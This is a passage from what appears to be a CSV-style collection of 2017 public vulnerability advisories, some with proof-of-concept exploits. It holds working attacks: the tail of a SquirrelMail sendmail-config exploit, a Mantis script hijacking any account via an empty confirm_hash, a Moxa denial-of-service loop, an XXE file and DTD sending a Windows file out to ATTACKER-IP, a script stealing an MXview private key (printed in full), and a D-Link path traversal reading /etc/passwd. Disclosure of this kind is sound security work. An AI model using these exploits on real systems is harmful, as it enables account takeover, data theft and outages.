R<> $* < @ [ $* ] , $+ > $* $1 < @ [ $2 ] , $3 > $4
R<> $* < @ [ $* ] $+ > $* $#error $@ 5.1.2 $: ""553 Invalid address""
R<> $* < @ [ $+ ] > $* $1 < @ [ $2 ] > $3
R<> $* <$* : $* > $* $#error $@ 5.1.3 $: ""553 Colon illegal in host name part""
R<> $* $1
R$* < @ . $* > $* $#error $@ 5.1.2 $: ""553 Invalid host name""
R$* < @ $* .. $* > $* $#error $@ 5.1.2 $: ""553 Invalid host name""
R$* < @ $* @ > $* $#error $@ 5.1.2 $: ""553 Invalid route address""
R$* @ $* < @ $* > $* $#error $@ 5.1.3 $: ""553 Invalid route address""
R$* , $~O $* $#error $@ 5.1.3 $: ""553 Invalid route address""
R$* < @ > $* $@ $>Parse0 $>canonify $1 user@ => user
R< @ $=w . > : $* $@ $>Parse0 $>canonify $2 @here:... -> ...
R$- < @ $=w . > $: $(dequote $1 $) < @ $2 . > dequote ""foo""@here
R< @ $+ > $#error $@ 5.1.3 $: ""553 User address required""
R$* $=O $* < @ $=w . > $@ $>Parse0 $>canonify $1 $2 $3 ...@here -> ...
R$- $: $(dequote $1 $) < @ *LOCAL* > dequote ""foo""
R< @ *LOCAL* > $#error $@ 5.1.3 $: ""553 User address required""
R$* $=O $* < @ *LOCAL* >
$@ $>Parse0 $>canonify $1 $2 $3 ...@*LOCAL* -> ...
R$* < @ *LOCAL* > $: $1
SParse1
R$* < @ [ $+ ] > $* $: $>ParseLocal $1 < @ [ $2 ] > $3 numeric internet spec
R$* < @ [ $+ ] > $* $: $1 < @ [ $2 ] : $S > $3 Add smart host to path
R$* < @ [ $+ ] : > $* $#esmtp $@ [$2] $: $1 < @ [$2] > $3 no smarthost: send
R$* < @ [ $+ ] : $- : $*> $* $#$3 $@ $4 $: $1 < @ [$2] > $5 smarthost with mailer
R$* < @ [ $+ ] : $+ > $* $#esmtp $@ $3 $: $1 < @ [$2] > $4 smarthost without mailer
R$=L < @ $=w . > $#local $: @ $1 special local names
R$+ < @ $=w . > $#local $: $1 regular local name
R$* < @ $* > $* $: $>MailerToTriple < $S > $1 < @ $2 > $3 glue on smarthost name
R$* < @$* > $* $#esmtp $@ $2 $: $1 < @ $2 > $3 user host domain
R$=L $#local $: @ $1 special local names
R$+ $#local $: $1 regular local names
SLocal_localaddr
Slocaladdr=5
R$+ $: $1 $| $>""Local_localaddr"" $1
R$+ $| $#ok $@ $1 no change
R$+ $| $#$* $#$2
R$+ $| $* $: $1
R$+ + * $#local $@ $&h $: $1
R$+ + $* $#local $@ + $2 $: $1 + *
R$+ $: <> $1
R< > $+ $: < > < $1 <> $&h > nope, restore +detail
R< > < $+ <> + $* > $: < > < $1 + $2 > check whether +detail
R< > < $+ <> $* > $: < > < $1 > else discard
R< > < $+ + $* > $* < > < $1 > + $2 $3 find the user part
R< > < $+ > + $* $#local $@ $2 $: @ $1 strip the extra +
R< > < $+ > $@ $1 no +detail
R$+ $: $1 <> $&h add +detail back in
R$+ <> + $* $: $1 + $2 check whether +detail
R$+ <> $* $: $1 else discard
R< local : $* > $* $: $>MailerToTriple < local : $1 > $2 no host extension
R< error : $* > $* $: $>MailerToTriple < error : $1 > $2 no host extension
R< $~[ : $+ > $+ $: $>MailerToTriple < $1 : $2 > $3 < @ $2 >
R< $+ > $+ $@ $>MailerToTriple < $1 > $2 < @ $1 >
SParseLocal=98
SEnvFromL
R<@> $n errors to mailer-daemon
R@ <@ $*> $n temporarily bypass Sun bogosity
R$+ $: $>AddDomain $1 add local domain if needed
R$* $: $>MasqEnv $1 do masquerading
SEnvToL
R$+ < @ $* > $: $1 strip host part
R$+ + $* $: < $&{addr_type} > $1 + $2 mark with addr type
R<e s> $+ + $* $: $1 remove +detail for sender
R< $* > $+ $: $2 else remove mark
SHdrFromL
R<@> $n errors to mailer-daemon
R@ <@ $*> $n temporarily bypass Sun bogosity
R$+ $: $>AddDomain $1 add local domain if needed
R$* $: $>MasqHdr $1 do masquerading
SHdrToL
R$+ $: $>AddDomain $1 add local domain if needed
R$* $: $>MasqHdr $1 do all-masquerading
SAddDomain
R$* < @ $* > $* $@ $1 < @ $2 > $3 already fully qualified
R$+ $@ $1 < @ *LOCAL* > add local qualification
Mlocal, P=/bin/bash, F=lsDFMAw5:/|@qPn9S, S=EnvFromL/HdrFromL, R=EnvToL/HdrToL,
T=DNS/RFC822/X-Unix,
A=X %s
Mprog, P=/bin/sh, F=lsDFMoqeu9, S=EnvFromL/HdrFromL, R=EnvToL/HdrToL, D=$z:/,
T=X-Unix/X-Unix/X-Unix,
A=sh -c $u
""""""
if __name__ == '__main__':
main(sys.argv)
EOF
SOLUTION
Since the vendor did not respond to our mails, no official fix is available.
However, the following unofficial patch can be used to fix this vulnerability.
BOF
diff -ruN squirrelmail-webmail-1.4.22/class/deliver/Deliver_SendMail.class.php squirrelmail-webmail-1.4.22-fix-CVE-2017-7692/class/deliver/Deliver_SendMail.class.php
--- squirrelmail-webmail-1.4.22/class/deliver/Deliver_SendMail.class.php 2011-01-06 02:44:03.000000000 +0000
+++ squirrelmail-webmail-1.4.22-fix-CVE-2017-7692/class/deliver/Deliver_SendMail.class.php 2017-04-18 11:42:26.505181944 +0000
@@ -93,9 +93,9 @@
$envelopefrom = trim($from->mailbox.'@'.$from->host);
$envelopefrom = str_replace(array("""","" ""),array('',''),$envelopefrom);
// save executed command for future reference
- $this->sendmail_command = ""$sendmail_path $this->sendmail_args -f$envelopefrom"";
+ $this->sendmail_command = escapeshellcmd(""$sendmail_path $this->sendmail_args -f"") . escapeshellarg($envelopefrom);
// open process handle for writing
- $stream = popen(escapeshellcmd($this->sendmail_command), ""w"");
+ $stream = popen($this->sendmail_command, ""w"");
return $stream;
}
EOF
REFERENCES
https://squirrelmail.org/
https://www.wearesegment.com/research/Squirrelmail-Remote-Code-Execution.html"
1905,CVE-2017-7615 Mantis Bug Tracker v1.3.0 / 2.3.0 Pre-Auth Remote Password Reset,,CVE-2017-7615,"[+] Credits: John Page a.k.a hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/MANTIS-BUG-TRACKER-PRE-AUTH-REMOTE-PASSWORD-RESET.txt
[+] ISR: ApparitionSec
Vendor:
================
www.mantisbt.org
Product:
==================
Mantis Bug Tracker
v1.3.0 / 2.3.0
MantisBT is a popular free web-based bug tracking system. It is written in PHP works with MySQL, MS SQL, and PostgreSQL databases.
Vulnerability Type:
===============================
Pre-Auth Remote Password Reset
CVE Reference:
==============
CVE-2017-7615
Security Issue:
================
Mantis account verification page 'verify.php' allows resetting ANY user's password.
Remote un-authenticated attackers can send HTTP GET requests to Hijack ANY Mantis accounts by guessing the ID / username.
Vulnerable code:
In verify.php line 66:
if( $f_confirm_hash != $t_token_confirm_hash ) {

trigger_error( ERROR_LOST_PASSWORD_CONFIRM_HASH_INVALID, ERROR );
}
This code attempts to verify a user account and compares hashes for a user request.
However, by supplying empty value we easily bypass the security check.
e.g.
http://127.0.0.1/mantisbt-2.3.0/verify.php?id=1&confirm_hash=
This will then allow you to change passwords and hijack ANY mantisbt accounts.
All version >= 1.3.0 as well as 2.3.0 are affected, 1.2.x versions are not affected.
References:
============
https://mantisbt.org/bugs/view.php?id=22690#c56509
POC Video URL:
==============
https://vimeo.com/213144905
Exploit/POC:
=============
import cookielib,urllib,urllib2,time
print 'Mantis Bug Tracker >= v1.3.0 - 2.3.0'
print '1.2.x versions are not affected'
print 'Remote Password Reset 0day Exploit'
print 'Credits: John Page a.k.a HYP3RLINX / APPARITIONSEC '
IP=raw_input(""[Mantis Victim IP]>"")
realname=raw_input(""[Username]"")
verify_user_id=raw_input(""[User ID]"")
passwd=raw_input(""[New Password]"")
TARGET = 'http://'+IP+'/mantisbt-2.3.0/verify.php?id='+verify_user_id+'&confirm_hash='
values={}
account_update_token=''
#verify_user_id='1' #Admin = 1
#realname='administrator' #Must be known or guessed.
#REQUEST 1, get Mantis account_update_token
cookies = cookielib.CookieJar()
opener = urllib2.build_opener(
urllib2.HTTPRedirectHandler(),
urllib2.HTTPHandler(debuglevel=0),
urllib2.HTTPSHandler(debuglevel=0),
urllib2.HTTPCookieProcessor(cookies))
res = opener.open(TARGET)
arr=res.readlines()
for s in arr:
if 'account_update_token' in s:
break
#print s[61:-38]
ACCT_TOKEN=s[61:-38]
time.sleep(0.3)
#REQUEST 2 Hijack the Admin Account
TARGET='http://'+IP+'/mantisbt-2.3.0/account_update.php'
values = {'verify_user_id' : '1',
'account_update_token' : ACCT_TOKEN,
'realname' : realname,
'password' : passwd,
'password_confirm' : passwd}
data = urllib.urlencode(values)
opener = urllib2.build_opener(
urllib2.HTTPRedirectHandler(),
urllib2.HTTPHandler(debuglevel=0),
urllib2.HTTPSHandler(debuglevel=0),
urllib2.HTTPCookieProcessor(cookies))
response = opener.open(TARGET, data)
the_page = response.read()
http_headers = response.info()
#print http_headers
print response.getcode()
print 'Account Hijacked!'
time.sleep(2)
Network Access:
===============
Remote
Severity:
=========
Critical
Disclosure Timeline:
=============================
Vendor Notification: April 7, 2017
Vendor acknowledged: April 7, 2017
Vendor patch created: April 10, 2017
Vendor Disclosure: April 16, 2017
April 16, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1906,[CVE-2017-5661] Apache XML Graphics FOP information disclosure vulnerability,,CVE-2017-5661,"CVE-2017-5661:
Apache XML Graphics FOP information disclosure vulnerability
Severity:
Medium
Vendor:
The Apache Software Foundation
Versions Affected:
FOP 1.0 - 2.1
Description:
Files lying on the filesystem of the server which uses batik can
be revealed to arbitrary users who send maliciously formed SVG
files. The file types that can be shown depend on the user context
in which the exploitable application is running. If the user is root
a full compromise of the server--including confidential or sensitive
files--would be possible.
XXE can also be used to attack the availability of the server
via denial of service as the references within a xml document
can trivially trigger an amplification attack.
Mitigation:
Users should upgrade to FOP 2.2+
Credit:
This issue was independently reported by Pierre Ernst at Salesforce.
References:
http://xmlgraphics.apache.org/security.html
The Apache XML Graphics team."
1907,[ANNOUNCE] HPACK Bomb Attack vulnerability in ATS - CVE-2016-5396,,CVE-2016-5396,"There is a vulnerability in ATS with the HPACK Bomb Attack that can lead to a DoS. Versions 6.0.0 to 6.2.0 are affected. Please upgrade to ATS 6.2.1 or 7.0.0.
Downloads:
https://trafficserver.apache.org/downloads
Jira Ticket:
ttps://issues.apache.org/jira/browse/TS-5019
CVE
https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-5396
-Bryan"
1917,CVE-2017-7456 Moxa MXview v2.8 Denial Of Service,,CVE-2017-7456,"[+] Credits: John Page AKA hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/MOXA-MXVIEW-v2.8-DENIAL-OF-SERVICE.txt
[+] ISR: ApparitionSec
Vendor:
============
www.moxa.com
Product:
===========
MXView v2.8
Download:
http://www.moxa.com/product/MXstudio.htm
MXview Industrial Network Management Software.
Auto discovery of network devices and physical connections
Event playback for quick troubleshooting
Color-coded VLAN/IGMP groups and other visualized network data
Supports MXview ToGo mobile app for remote monitoring and notification�anytime, anywhere.
Vulnerability Type:
===================
Denial Of Service
CVE Reference:
==============
CVE-2017-7456
Security Issue:
================
Remote attackers can DOS MXView server by sending large string of junk characters for the user ID and password field login credentials.
Exploit/POC:
=============
import urllib,urllib2
print 'Moxa MXview v2.8 web interface DOS'
print 'hyp3rlinx'
IP=raw_input(""[Moxa MXView IP]>"")
PAYLOAD=""A""*200000000
url = 'http://'+IP+'/goform/account'
data = urllib.urlencode({'uid' : PAYLOAD, 'pwd' : PAYLOAD, 'action' : 'login'})
while 1:
req = urllib2.Request(url, data)
res = urllib2.urlopen(req)
print res
Network Access:
===============
Remote
Severity:
=========
Medium
Disclosure Timeline:
==========================================================
Vendor Notification: March 5, 2017
Vendor confirms vulnerability : March 21, 2017
Vendor ""updated firmware April 7, 2017"" : March 29, 2017
April 9, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1918,CVE-2017-7457 Moxa MX AOPC-Server v1.5 XML External Entity Injection,,CVE-2017-7457,"[+] Credits: John Page AKA HYP3RLINX
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/MOXA-MX-AOPC-SERVER-v1.5-XML-EXTERNAL-ENTITY.txt
[+] ISR: ApparitionSec
Vendor:
============
www.moxa.com
Product:
=======================
MX-AOPC UA SERVER - 1.5
Moxa's MX-AOPC UA Suite is the first OPC UA server for industrial automation supporting both push and pull communication.
Vulnerability Type:
==============================
XML External Entity Injection
CVE Reference:
==============
CVE-2017-7457
Security Issue:
================
XML External Entity via "".AOP"" files used by MX-AOPC Server result in remote file disclosure. If local user opens
a specially crafted malicious MX-AOPC Server file type.
Exploit/POC:
=============
run MX-AOPC UA Server / Runtime / Start Server Runtime Service
a) ATTACKER SERVER LISTENER we will access Windows msfmap.ini as proof of concept
python -m SimpleHTTPServer 8080
""Evil.AOP"" file
<?xml version=""1.0""?>
<!DOCTYPE roottag [
<!ENTITY % file SYSTEM ""c:Windowsmsdfmap.ini"">
<!ENTITY % dtd SYSTEM ""http://ATTACKER-IP:8080/payload.dtd"">
%dtd;]>
<pwn>&send;</pwn>
b) Evil ""payload.dtd"" file host on ATTACKER SERVER
<?xml version=""1.0"" encoding=""UTF-8""?>
<!ENTITY % all ""<!ENTITY send SYSTEM 'http://ATTACKER-IP:8080?%file;'>"">
%all;
e.g.
python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
VICTIM-IP - - [02/Mar/2017 10:06:00] ""GET /payload.dtd HTTP/1.1"" 200 -
VICTIM-IP - - [02/Mar/2017 10:06:00] ""GET /?;[connect%20name]%20will%20modify%20the%20connection%20if%20ADC.connect=""name"";[connect%20default]%20will%20modify%20the%20connection%20if%20name%20is%20not%20found;[sql%20name]%20will%20modify%20the%20Sql%20if%20ADC.sql=""name(args)"";[sql%20default]%20will%20modify%20the%20Sql%20if%20name%20is%20not%20found;Override%20strings:%20Connect,%20UserId,%20Password,%20Sql.;Only%20the%20Sql%20strings%20support%20parameters%20using%20""?"";The%20override%20strings%20must%20not%20equal%20""""%20or%20they%20are%20ignored;A%20Sql%20entry%20must%20exist%20in%20each%20sql%20section%20or%20the%20section%20is%20ignored;An%20Access%20entry%20must%20exist%20in%20each%20connect%20section%20or%20the%20section%20is%20ignored;Access=NoAccess;Access=ReadOnly;Access=ReadWrite;[userlist%20name]%20allows%20specific%20users%20to%20have%20special%20access;The%20Access%20is%20computed%20as%20follows:;%20%20(1)%20First%20take%20the%20access%20of%20the%20connect%20section.;%20%20(2)%20If%20a%20user%20entry%20is%20found,%20it%20will%20override.[connect%20default];If%20we%20want%20to%20disable%20unknown%20connect%20values,%20we%20set%20Access%20to%20NoAccessAccess=NoAccess[sql%20default];If%20we%20want%20to%20disable%20unknown%20sql%20values,%20we%20set%20Sql%20to%20an%20invalid%20query.Sql=""%20""[connect%20CustomerDatabase]Access=ReadWriteConnect=""DSN=AdvWorks""[sql%20CustomerById]Sql=""SELECT%20*%20FROM%20Customers%20WHERE%20CustomerID%20=%20?""[connect%20AuthorDatabase]Access=ReadOnlyConnect=""DSN=MyLibraryInfo;UID=MyUserID;PWD=MyPassword""[userlist%20AuthorDatabase]Administrator=ReadWrite[sql%20AuthorById]Sql=""SELECT%20*%20FROM%20Authors%20WHERE%20au_id%20=%20?"" HTTP/1.1"" 200 -
Network Access:
===============
Remote
Severity:
=========
High
Disclosure Timeline:
==========================================================
Vendor Notification: March 5, 2017
Vendor confirms vulnerability : March 21, 2017
Vendor ""updated firmware April 7, 2017"" : March 29, 2017
April 9, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1919,CVE-2017-7455 Moxa MXview v2.8 Remote Private Key Disclosure,,CVE-2017-7455,"[+] Credits: John Page AKA HYP3RLINX
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/MOXA-MXVIEW-v2.8-REMOTE-PRIVATE-KEY-DISCLOSURE.txt
[+] ISR: APPARITIONSEC
Vendor:
============
www.moxa.com
Product:
===========
MXview V2.8
Download:
http://www.moxa.com/product/MXstudio.htm
MXview Industrial Network Management Software.
Auto discovery of network devices and physical connections
Event playback for quick troubleshooting
Color-coded VLAN/IGMP groups and other visualized network data
Supports MXview ToGo mobile app for remote monitoring and notification�anytime, anywhere.
Vulnerability Type:
=============================
Remote Private Key Disclosure
CVE Reference:
==============
CVE-2017-7455
Security Issue:
================
MXview stores a copy of its web servers private key under C:UsersTARGET-USERAppDataRoamingmoxamxviewwebcertsmxview.key.
Remote attackers can easily access/read this private key ""mxview.key"" file by making an HTTP GET request.
e.g.
curl -v http://VICTIM-IP:81/certs/mxview.key
* About to connect() to VICTIM-IP port 81
* Trying VICTIM-IP... connected
* Connected to VICTIM-IP (VICTIM-IP) port 81
> GET /certs/mxview.key HTTP/1.1
> User-Agent: curl/7.15.5 (x86_64-redhat-linux-gnu) libcurl/7.15.5
> Host: VICTIM-IP:81
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Tue Feb 28 14:18:00 2017
< Server: GoAhead-Webs
< Last-modified: Tue Feb 28 10:46:51 2017
< Content-length: 916
< Content-type: text/plain
-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG2w0BAQEFAASCAmEwggJdAgEAAoGBAMO2BjHS6rFYqxPb
QCjhVn5+UGwfICfETzk5JQvhkhc71bnsDHI7lVyYhheYLcPQBEglVolwGANPp7LF
2lhG+UaSFfTVk8UDvV0qQpjSQvDjcWSuKBfceyT5zmI8ynxuMHoqBR7ZOSLY31z+
Rxt+JCykwqfMGdjawnC5ivr8iWDpAgMBAAECgYAQpHjwYbQtcpHRtXJGR6s4RHuI
RjlQyGPIRPC+iucGbMMm9Ui1qhVwc1Pry7gQj67dh7dNJqgUGAD1tdd0bEykKoqm
ICgXj0HMPCLxUy4CHIZInsBhzAyp/3atkDIaeELZckCbmttkVvncDi+b9HnuL/To
YwJpuLkpXEKpjK7iAQJBAOof+yliPn7UsBecw/Hc/ixeDRGI1kjtvuOvSi6jLZoj
3rzODMSD1eRcrK/GJydWVT8TV3WXXYn3M1cu3kmQJKkCQQDV/zlBtFFPPVAl1zy7
UBG+RPI63uXeaA0C1+RX2XfJSR4zeKxnWgalzUl0UwMgWB3Gpp2+VW5a/zw3aKlK
6MJBAkBHPMXqWKdVZhfSh3Ojky+PhmqJjE5PUG/FzZ9Pw3zrqsBqSHPgE5Ewc/Zj
YXKmavCbSaJR+GWQxjPL8knWrlJJAkEAkahnEJHrxkO1igw3Ckg0y4yiU+/kBr5M
HONWSXV8U0WxiNdagf6FB9XzaXoXZuyTl+NQ+3yq4MVZ910F3jcQAQJBAI+q0AcX
EskHai2Fx24gkHwwRxacsiXrRClxIj5NB52CSo2Sy6EF02DKQVWR3oIjDesXcWvl
+CPTV6agBkYxe7Q=
-----END PRIVATE KEY-----
Exploit:
=========
import socket
print 'Moxa MXview 2.8 Remote Private Key Theft'
print 'by hyp3rlinx '
IP=raw_input(""[Moxa MXview IP]> "")
PORT=int(raw_input(""[PORT]> ""))
STEAL_PRV_KEY=""GET /certs/mxview.key HTTP/1.1 Host: ""+IP+"" ""
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((IP,PORT))
s.send(STEAL_PRV_KEY)
print 'Enjoy ur private server key! '
print s.recv(512)
s.close()
Network Access:
===============
Remote
Severity:
=========
Critical
Disclosure Timeline:
===================================
Vendor Notification: March 5, 2017
Vendor confirms vulnerability : March 21, 2017
Vendor ""updated firmware April 7, 2017"" : March 29, 2017
April 9, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
HYP3RLINX"
1924,[SECURITY] CVE-2017-5648 Apache Tomcat Information Disclosure,,CVE-2017-5648,"CVE-2017-5648 Apache Tomcat Information Disclosure
Severity: Low
Vendor: The Apache Software Foundation
Versions Affected:
Apache Tomcat 9.0.0.M1 to 9.0.0.M17
Apache Tomcat 8.5.0 to 8.5.11
Apache Tomcat 8.0.0.RC1 to 8.0.41
Apache Tomcat 7.0.0 to 7.0.75
Apache Tomcat 6.0.x is not affected
Description
While investigating bug 60718, it was noticed that some calls to
application listeners did not use the appropriate facade object. When
running an untrusted application under a SecurityManager, it was
therefore possible for that untrusted application to retain a reference
to the request or response object and thereby access and/or modify
information associated with another web application.
Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 9.0.0.M18 or later
- Upgrade to Apache Tomcat 8.5.12 or later
- Upgrade to Apache Tomcat 8.0.42 or later
- Upgrade to Apache Tomcat 7.0.76 or later
Credit:
This issue was identified by the Tomcat security team.
History:
2017-04-10 Original advisory
References:
[1] https://bz.apache.org/bugzilla/show_bug.cgi?id=60718
[2] http://tomcat.apache.org/security-9.html
[3] http://tomcat.apache.org/security-8.html
[4] http://tomcat.apache.org/security-7.html"
1925,[SECURITY] CVE-2017-5651 Apache Tomcat Information Disclosure,,CVE-2017-5651,"CVE-2017-5651 Apache Tomcat Information Disclosure
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
Apache Tomcat 9.0.0.M1 to 9.0.0.M18
Apache Tomcat 8.5.0 to 8.5.12
Apache Tomcat 8.0.x and earlier are not affected
Description:
The refactoring of the HTTP connectors for 8.5.x onwards, introduced a
regression in the send file processing. If the send file processing
completed quickly, it was possible for the Processor to be added to the
processor cache twice. This could result in the same Processor being
used for multiple requests which in turn could lead to unexpected errors
and/or response mix-up.
Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 9.0.0.M19 or later
- Upgrade to Apache Tomcat 8.5.13 or later
Credit:
This issue was reported publicly as Bug 60918 [1] and the security
implications identified by the Tomcat security team.
History:
2017-04-10 Original advisory
References:
[1] https://bz.apache.org/bugzilla/show_bug.cgi?id=60918
[2] http://tomcat.apache.org/security-9.html
[3] http://tomcat.apache.org/security-8.html"
1931,[CVE-2016-6805] Arbitrary File Read due to eXternal Xml Entity attack in Apache Ignite,,CVE-2016-6805,"[CVE-2016-6805] Arbitrary File Read due to eXternal Xml Entity attack in Apache Ignite
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected: Apache Ignite 1.0.0-RC3 to 1.8
Description:
Apache Ignite uses an update notifier component to update the users about new project releases that include additional functionality, bug fixes and performance improvements. To do that the component communicates to an external PHP server (http://ignite.run) where it needs to send some system properties like Apache Ignite or Java version. This feature is enabled by default and used to send sensitive data over HTTP by mistake, such as installation folders or environment variables stored in Java system properties. The second issue is because TLS is not used between the application and the PHP server, a Man-in-the-middle attack is possible and a malicious actor could alter the response coming from the ignite.run server. This response is parsed by the Apache ignite component as XML, and a XXE attack can be triggered.
Both issues mentioned above were fixed as a part of Apache Ignite 1.9 release. The relevant commits with the changes:
Mitigation:
Users must upgrade to Apache Ignite 1.9 or later versions or disable the update notifier.
Credit:
Pierre Ernst, Salesforce"
1932,D-Link DWR-116 - CVE-2017-6190 - Arbitrary File Download,,CVE-2017-6190,"# Title: D-Link DWR-116 Arbitrary File Download
# Vendor: D-Link (www.dlink.com)
# Affected model(s): DWR-116 / DWR-116A1
# Tested on: V1.01(EU), V1.00(CP)b10, V1.05(AU)
# CVE: CVE-2017-6190
# Date: 04.07.2016
# Author: Patryk Bogdan (@patryk_bogdan)
Description:
D-Link DWR-116 with firmware before V1.05b09 suffers from vulnerability
which leads to unathorized file download from device filesystem.
PoC:
HTTP Request:
GET /uir/../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 192.168.2.1
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
HTTP Response:
HTTP/1.0 200 OK
Content-Type: application/x-none
Cache-Control: max-age=60
Connection: close
root:$1$$taUxCLWfe3rCh2ylnFWJ41:0:0:root:/root:/bin/ash
nobody:$1$$qRPK7m23GJusamGpoGLby/:99:99:nobody:/var/usb:/sbin/nologin
ftp:$1$$qRPK7m23GJusamGpoGLby/:14:50:FTP USER:/var/usb:/sbin/nologin
Fix:
Update device to the new firmware (V1.05b09)"
1934,Apple Music Android Application - MITM SSL Certificate Vulnerability (CVE-2017-2387),,CVE-2017-2387,"Apple Music Android Application - MITM SSL Certificate Vulnerability
(CVE-2017-2387)
--
http://www.info-sec.ca/advisories/Apple-Music.html
Overview
""Listen to all the music you want, anytime.""
(https://play.google.com/store/apps/details?id=com.apple.android.music)
Issue
The Apple Music Android application (version 1.2.1 and below), does
not validate the SSL certificates it receives when connecting to the
mobile application login and payment servers.
Impact
An attacker who can perform a man in the middle attack may present
bogus SSL certificates which the application will accept silently.
Sensitive information could be captured by an attacker without the
user's knowledge.
Timeline
August 5, 2016 - Notified Apple via product-security apple com
August 5, 2016 - Apple sent an auto acknowledgment
August 16, 2016 - Apple responded stating that they are investigating
October 5, 2016 - Apple confirmed the vulnerability
January 18, 2017 - Asked for a status update
January 20, 2017 - Apple responded stating that they are still working
on the issue
April 4, 2017 - Apple released version 2.0.0 which resolves this vulnerability
Solution
Upgrade to version 2.0.0 or later
https://support.apple.com/en-us/HT207605
https://support.apple.com/en-us/HT201222
CVE-ID:
CVE-2017-2387"
1944,CVE-2017-7185 - Mongoose OS - Use-after-free / Denial of Service,,CVE-2017-7185,"#############################################################
#
# COMPASS SECURITY ADVISORY
# https://www.compass-security.com/en/research/advisories/
#
#############################################################
#
# Product: Mongoose OS
# Vendor: Cesanta
# CVE ID: CVE-2017-7185
# CSNC ID: CSNC-2017-003
# Subject: Use-after-free / Denial of Service
# Risk: Medium
# Effect: Remotely exploitable
# Authors:
# Philipp Promeuschel <philipp.promeuschel compass-security com>
# Carel van Rooyen <carel.vanrooyen compass-security com>
# Stephan Sekula <stephan.sekula compass-security com>
# Date: 2017-04-03
#
#############################################################
Introduction:
-------------
Cesanta's Mongoose OS [1] - an open source operating system for the Internet of Things. Supported micro controllers:
* ESP32
* ESP8266
* STM32
* TI CC3200
Additionally, Amazon AWS IoT is integrated for Cloud connectivity. Developers can write applications in C or JavaScript (the latter by using the v7 component of Mongoose OS).
Affected versions:
---------
Vulnerable:
* <= Release 1.2
Not vulnerable:
* Patched in current dev / master branch
Not tested:
* N/A
Technical Description
---------------------
The handling of HTTP-Multipart boundary [3] headers does not properly close connections when malformed requests are sent to the Mongoose server.
This leads to a use-after-free/null-pointer-de-reference vulnerability, causing the Mongoose HTTP server to crash. As a result, the entire system is rendered unusable.
The mg_parse_multipart [2] function performs proper checks for empty boundaries, but, since the flag ""MG_F_CLOSE_IMMEDIATELY"" does not have any effect, mg_http_multipart_continue() is called:
--------------->8---------------
void mg_http_handler(struct mg_connection *nc, int ev, void *ev_data) {
[CUT BY COMPASS]
#if MG_ENABLE_HTTP_STREAMING_MULTIPART
if (req_len > 0 && (s = mg_get_http_header(hm, ""Content-Type"")) != NULL &&
s->len >= 9 && strncmp(s->p, ""multipart"", 9) == 0) {
mg_http_multipart_begin(nc, hm, req_len); // properly checks for empty boundary
// however, the socket is not closed, and mg_http_multipart_continue() is executed
mg_http_multipart_continue(nc);
return;
}
---------------8<---------------
In the mg_http_multipart_begin function, the boundary is correctly verified:
--------------->8---------------
boundary_len =
mg_http_parse_header(ct, ""boundary"", boundary, sizeof(boundary));
if (boundary_len == 0) {
/*
* Content type is multipart, but there is no boundary,
* probably malformed request
*/
nc->flags = MG_F_CLOSE_IMMEDIATELY;
DBG((""invalid request""));
goto exit_mp;
}
---------------8<---------------
However, the socket is not closed (even though the flag ""MG_F_CLOSE_IMMEDIATELY"" has been set), and mg_http_multipart_continue is executed.
In mg_http_multipart_continue(), the method mg_http_multipart_wait_for_boundary() is executed:
---------------8<---------------
static void mg_http_multipart_continue(struct mg_connection *c) {
struct mg_http_proto_data *pd = mg_http_get_proto_data(c);
while (1) {
switch (pd->mp_stream.state) {
case MPS_BEGIN: {
pd->mp_stream.state = MPS_WAITING_FOR_BOUNDARY;
break;
}
case MPS_WAITING_FOR_BOUNDARY: {
